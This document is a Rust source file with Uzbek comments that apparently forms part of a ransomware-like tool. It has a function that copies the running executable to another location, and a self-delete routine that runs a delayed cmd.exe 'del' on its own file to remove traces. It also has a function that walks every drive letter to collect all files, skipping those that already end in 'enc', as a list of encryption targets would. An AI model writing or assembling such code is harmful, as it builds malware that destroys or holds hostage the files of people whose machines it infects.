use std::path::{Path, PathBuf};
use std::process::Command;
use std::{env, fs};
use walkdir::WalkDir;

pub fn clone_self(new_location: &String) {
    let target = Path::new(&new_location);

    // O'z exe faylimiz manzilini olish
    let me = match env::current_exe() {
        Ok(path) => path,
        Err(e) => {
            eprintln!("Ijro fayl yo'lini olishda xato: {}", e);
            return;
        }
    };

    // Papkani yaratish (agar yo'q bo'lsa)
    if let Some(parent) = target.parent() {
        if let Err(e) = fs::create_dir_all(parent) {
            eprintln!("Papkani yaratishda xato: {}", e);
            return;
        }
    }
    
    // Agar eski nusxa mavjud bo‘lsa — o‘chirib tashlaymiz
    if target.exists() {
        match fs::remove_file(&target) {
            Ok(_) => println!("Eski nusxa o'chirildi: {}", target.display()),
            Err(e) => {
                eprintln!("Eski nusxani o‘chirishda xato: {}", e);
                return;
            }
        }
    }

    // Fayl nusxalash
    match fs::copy(&me, target) {
        Ok(_) => println!("Nusxa olindi: {}", target.display()),
        Err(e) => eprintln!("Nusxalashda xato: {}", e),
    }
}

pub fn self_delete() {
    // O'z exe faylimiz manzilini olish
    let me = match env::current_exe() {
        Ok(path) => path,
        Err(e) => {
            eprintln!("Ijro fayl yo'lini olishda xato: {}", e);
            return;
        }
    };

    let me_str = me.to_string_lossy().to_string();

    // cmd.exe orqali 1 soniya kutib, faylni o'chirish
    // /C => buyruqni bajarib chiqib ketish
    // timeout /T 1 => 1 soniya kutish
    let _ = Command::new("cmd")
        .args(&["/C", &format!("timeout /T 1 > NUL && del \"{}\"", me_str)])
        .spawn();

    println!("O'z-o'zini o'chirish jarayoni ishga tushirildi.");
}

pub fn collect_paths(excluded_paths: &[&str]) -> Result<Vec<PathBuf>, Box<dyn std::error::Error>>{
    let mut paths = Vec::new();
    for drive in ["A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "W", "X", "Y", "Z"]{
        let root = format!("{}:\\", drive);
        if Path::new(&root).exists() {
            for entry in WalkDir::new(&root).into_iter().filter_map(Result::ok) {
                let p = entry.into_path();
                if p.is_file() && !excluded_paths.iter().any(|ex| p.to_string_lossy().contains(ex)) && !p.to_string_lossy().ends_with("enc") {
                    paths.push(p);
                }
            }
        }
    }
    Ok(paths)
}